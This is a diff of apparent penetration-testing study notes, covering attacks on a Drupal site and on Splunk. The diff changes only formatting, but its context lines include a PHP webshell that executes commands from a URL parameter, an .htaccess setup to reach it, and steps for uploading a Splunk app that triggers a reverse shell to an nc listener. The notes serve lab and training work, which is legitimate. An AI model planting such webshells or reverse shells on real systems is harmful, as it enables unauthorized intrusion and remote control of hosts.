@@ -326,13 +326,13 @@ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
 tar xvf captcha-8.x-1.2.tar.gz
 ```
-Create a webshell file:
+- Create a webshell file:
 ```php
 <?php
 system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
 ?>
 ```
-Create a .htaccess file to give ourselves access to the folder
+- Create a .htaccess file to give ourselves access to the folder
 ```html
 <IfModule mod_rewrite.c>
 RewriteEngine On
@@ -586,6 +586,7 @@ sudo nmap -sV 10.129.201.50
 #### Abusing Built-In Functionality
 
 **Windows Hosts**
+
 - Clone reverse shell from GitHub
 ```bash
 git clone https://github.com/0xjpuff/reverse_shell_splunk.git
@@ -604,6 +605,7 @@ nc -nvlp 9001
 - ```Browse``` to select tar ball then click ```Upload``` this will trigger the reverse shell
 
 **Linux Hosts**
+
 - Edit ```rev.py``` to:
 ```python
 import sys,socket,os,pty
